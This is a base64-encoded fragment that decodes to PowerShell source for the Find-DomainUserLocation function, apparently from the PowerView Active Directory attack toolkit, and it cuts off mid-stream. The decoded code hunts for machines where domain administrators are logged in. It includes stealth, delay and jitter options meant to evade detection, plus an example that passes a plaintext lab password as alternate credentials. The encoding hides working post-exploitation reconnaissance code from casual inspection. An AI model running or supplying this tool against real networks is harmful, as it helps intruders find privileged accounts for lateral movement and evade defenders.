HNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluIGFuZCB0YXJnZXQgc3lzdGVtcy4KCi5QQVJBTUVURVIgU3RvcE9uU3VjY2VzcwoKU3dpdGNoLiBTdG9wIGh1bnRpbmcgYWZ0ZXIgZmluZGluZyBhZnRlciBmaW5kaW5nIGEgdGFyZ2V0IHVzZXIuCgouUEFSQU1FVEVSIERlbGF5CgpTcGVjaWZpZXMgdGhlIGRlbGF5IChpbiBzZWNvbmRzKSBiZXR3ZWVuIGVudW1lcmF0aW5nIGhvc3RzLCBkZWZhdWx0cyB0byAwLgoKLlBBUkFNRVRFUiBKaXR0ZXIKClNwZWNpZmllcyB0aGUgaml0dGVyICgwLTEuMCkgdG8gYXBwbHkgdG8gYW55IHNwZWNpZmllZCAtRGVsYXksIGRlZmF1bHRzIHRvICsvLSAwLjMKCi5QQVJBTUVURVIgU2hvd0FsbAoKU3dpdGNoLiBSZXR1cm4gYWxsIHVzZXIgbG9jYXRpb24gcmVzdWx0cyBpbnN0ZWFkIG9mIGZpbHRlcmluZyBiYXNlZCBvbiB0YXJnZXQKc3BlY2lmaWNhdGlvbnMuCgouUEFSQU1FVEVSIFN0ZWFsdGgKClN3aXRjaC4gT25seSBlbnVtZXJhdGUgc2Vzc2lvbnMgZnJvbSBjb25ub25seSB1c2VkIHRhcmdldCBzZXJ2ZXJzLgoKLlBBUkFNRVRFUiBTdGVhbHRoU291cmNlCgpUaGUgc291cmNlIG9mIHRhcmdldCBzZXJ2ZXJzIHRvIHVzZSwgJ0RGUycgKGRpc3RyaWJ1dGVkIGZpbGUgc2VydmVycyksCidEQycgKGRvbWFpbiBjb250cm9sbGVycyksICdGaWxlJyAoZmlsZSBzZXJ2ZXJzKSwgb3IgJ0FsbCcgKHRoZSBkZWZhdWx0KS4KCi5QQVJBTUVURVIgVGhyZWFkcwoKVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBmb3IgdXNlciBzZWFyY2hpbmcsIGRlZmF1bHRzIHRvIDIwLgoKLkVYQU1QTEUKCkZpbmQtRG9tYWluVXNlckxvY2F0aW9uCgpTZWFyY2hlcyBmb3IgJ0RvbWFpbiBBZG1pbnMnIGJ5IGVudW1lcmF0aW5nIGV2ZXJ5IGNvbXB1dGVyIGluIHRoZSBkb21haW4uCgouRVhBTVBMRQoKRmluZC1Eb21haW5Vc2VyTG9jYXRpb24gLVN0ZWFsdGggLVNob3dBbGwKCkVudW1lcmF0ZXMgbGlrZWx5IGhpZ2hseS10cmFmZmlja2VkIHNlcnZlcnMsIHBlcmZvcm1zIGp1c3Qgc2Vzc2lvbiBlbnVtZXJhdGlvbgphZ2FpbnN0IGVhY2gsIGFuZCBvdXRwdXRzIGFsbCByZXN1bHRzLgoKLkVYQU1QTEUKCkZpbmQtRG9tYWluVXNlckxvY2F0aW9uIC1Vc2VyQWRtaW5Db3VudCAtQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0gJ1dpbmRvd3MgNyonIC1Eb21haW4gZGV2LnRlc3RsYWIubG9jYWwKCkVudW1lcmF0ZXMgV2luZG93cyA3IGNvbXB1dGVycyBpbiBkZXYudGVzdGxhYi5sb2NhbCBhbmQgcmV0dXJucyB1c2VyIHJlc3VsdHMgZm9yIHByaXZpbGVnZWQKdXNlcnMgaW4gZGV2LnRlc3RsYWIubG9jYWwuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKRmluZC1Eb21haW5Vc2VyTG9jYXRpb24gLURvbWFpbiB0ZXN0bGFiLmxvY2FsIC1DcmVkZW50aWFsICRDcmVkCgpTZWFyY2hlcyBmb3IgZG9tYWluIGFkbWluIGxvY2F0aW9ucyBpbiB0aGUgdGVzdGxhYi5sb2NhbCB1c2luZyB0aGUgc3BlY2lmaWVkIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpQb3dlclZpZXcuVXNlckxvY2F0aW9uCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuVXNlckxvY2F0aW9uJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdVc2VyR3JvdXBJZGVudGl0eScpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdETlNIb3N0TmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckRvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckxEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZWFyY2hCYXNlLAoKICAgICAgICBbQWxpYXMoJ1VuY29uc3RyYWluZWQnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRDb21wdXRlclVuY29uc3RyYWluZWQsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdPcGVyYXRpbmdTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck9wZXJhdGluZ1N5c3RlbSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQYWNrJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZXJ2aWNlUGFjaywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NpdGVOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTaXRlTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1VzZXJJZGVudGl0eScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRVc2VySWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckRvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyU2VhcmNoQmFzZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1VzZXJHcm91cElkZW50aXR5JyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0dyb3VwTmFtZScsICdHcm91cCcpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkVXNlckdyb3VwSWRlbnRpdHkgPSAnRG9tYWluIEFkbWlucycsCgogICAgICAgIFtBbGlhcygnQWRtaW5Db3VudCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVzZXJBZG1pbkNvdW50LAoKICAgICAgICBbQWxpYXMoJ0FsbG93RGVsZWdhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVzZXJBbGxvd0RlbGVnYXRpb24sCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENoZWNrQWNjZXNzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU3RvcE9uU3VjY2VzcywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMC4wLCAxLjApXQogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnU2hvd0FsbCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNob3dBbGwsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFN0ZWFsdGgsCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdERlMnLCAnREMnLCAnRmlsZScsICdBbGwnKV0KICAgICAgICAkU3RlYWx0aFNvdXJjZSA9ICdBbGwnLAoKICAgICAgICBbSW50XQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMCldCiAgICAgICAgJFRocmVhZHMgPSAyMAogICAgKQoKICAgIEJFR0lOIHsKCiAgICAgICAgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnZG5zaG9zdG5hbWUnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyRG9tYWluJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckxEQVBGaWx0ZXInXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJENvbXB1dGVyTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZWFyY2hCYXNlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRDb21wdXRlclNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VuY29uc3RyYWluZWQnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snVW5jb25zdHJhaW5lZCddID0gJFVuY29uc3RyYWluZWQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyT3BlcmF0aW5nU3lzdGVtJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ09wZXJhdGluZ1N5c3RlbSddID0gJE9wZXJhdGluZ1N5c3RlbSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZXJ2aWNlUGFjayddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2aWNlUGFjayddID0gJFNlcnZpY2VQYWNrIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNpdGVOYW1lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NpdGVOYW1lJ10gPSAkU2l0ZU5hbWUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkVXNlclNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ3NhbWFjY291bnRuYW1lJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VySWRlbnRpdHknXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJFVzZXJJZGVudGl0eSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyRG9tYWluJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVXNlckRvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckxEQVBGaWx0ZXInXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkVXNlckxEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJTZWFyY2hCYXNlJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFVzZXJTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyQWRtaW5Db3VudCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0FkbWluQ291bnQnXSA9ICRVc2VyQWRtaW5Db3VudCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFsbG93RGVsZWdhdGlvbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0FsbG93RGVsZWdhdGlvbiddID0gJFVzZXJBbGxvd0RlbGVnYXRpb24gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gQCgpCgogICAgICAgICMgZmlyc3QsIGJ1aWxkIHRoZSBzZXQgb2YgY29tcHV0ZXJzIHRvIGVudW1lcmF0ZQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTmFtZSddKSB7CiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSBAKCRDb21wdXRlck5hbWUpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTdGVhbHRoJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gU3RlYWx0aCBlbnVtZXJhdGlvbiB1c2luZyBzb3VyY2U6ICRTdGVhbHRoU291cmNlIgogICAgICAgICAgICAgICAgJFRhcmdldENvbXB1dGVyQXJyYXlMaXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CgogICAgICAgICAgICAgICAgaWYgKCRTdGVhbHRoU291cmNlIC1tYXRjaCAnRmlsZXxBbGwnKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgZmlsZSBzZXJ2ZXJzJwogICAgICAgICAgICAgICAgICAgICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyRG9tYWluJ10pIHsgJEZpbGVTZXJ2ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkQ29tcHV0ZXJEb21haW4gfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2VhcmNoQmFzZSddKSB7ICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRDb21wdXRlclNlYXJjaEJhc2UgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJEZpbGVTZXJ2ZXJTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEZpbGVTZXJ2ZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICAgICAgICAgICRGaWxlU2VydmVycyA9IEdldC1Eb21haW5GaWxlU2VydmVyIEBGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICBpZiAoJEZpbGVTZXJ2ZXJzIC1pc25vdCBbU3lzdGVtLkFycmF5XSkgeyAkRmlsZVNlcnZlcnMgPSBAKCRGaWxlU2VydmVycykgfQogICAgICAgICAgICAgICAgICAgICRUYXJnZXRDb21wdXRlckFycmF5TGlzdC5BZGRSYW5nZSggJEZpbGVTZXJ2ZXJzICkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkU3RlYWx0aFNvdXJjZSAtbWF0Y2ggJ0RGU3xBbGwnKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgREZTIHNlcnZlcnMnCiAgICAgICAgICAgICAgICAgICAgIyAjIFRPRE86IGZpeCB0aGUgcGFzc2VkIHBhcmFtZXRlcnMgdG8gR2V0LURvbWFpbkRGU1NoYXJlCiAgICAgICAgICAgICAgICAgICAgIyAkQ29tcHV0ZXJOYW1lICs9IEdldC1Eb21haW5ERlNTaGFyZSAtRG9tYWluICREb21haW4gLVNlcnZlciAkRG9tYWluQ29udHJvbGxlciB8IEZvckVhY2gtT2JqZWN0IHskXy5SZW1vdGVTZXJ2ZXJOYW1lfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRTdGVhbHRoU291cmNlIC1tYXRjaCAnREN8QWxsJykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gUXVlcnlpbmcgZm9yIGRvbWFpbiBjb250cm9sbGVycycKICAgICAgICAgICAgICAgICAgICAkRENTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICdMREFQJyA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICREQ1NlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyRG9tYWluJ10pIHsgJERDU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkRENTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJERDU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgICAgICAkRG9tYWluQ29udHJvbGxlcnMgPSBHZXQtRG9tYWluQ29udHJvbGxlciBARENTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgICAgICAgICAgICAgaWYgKCREb21haW5Db250cm9sbGVycyAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHsgJERvbWFpbkNvbnRyb2xsZXJzID0gQCgkRG9tYWluQ29udHJvbGxlcnMpIH0KICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJBcnJheUxpc3QuQWRkUmFuZ2UoICREb21haW5Db250cm9sbGVycyApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gJFRhcmdldENvbXB1dGVyQXJyYXlMaXN0LlRvQXJyYXkoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgYWxsIGNvbXB1dGVycyBpbiB0aGUgZG9tYWluJwogICAgICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiAkKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoKSIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRlJwogICAgICAgIH0KCiAgICAgICAgIyBnZXQgdGhlIGN1cnJlbnQgdXNlciBzbyB3ZSBjYW4gaWdub3JlIGl0IGluIHRoZSByZXN1bHRzCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRDdXJyZW50VXNlciA9ICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50a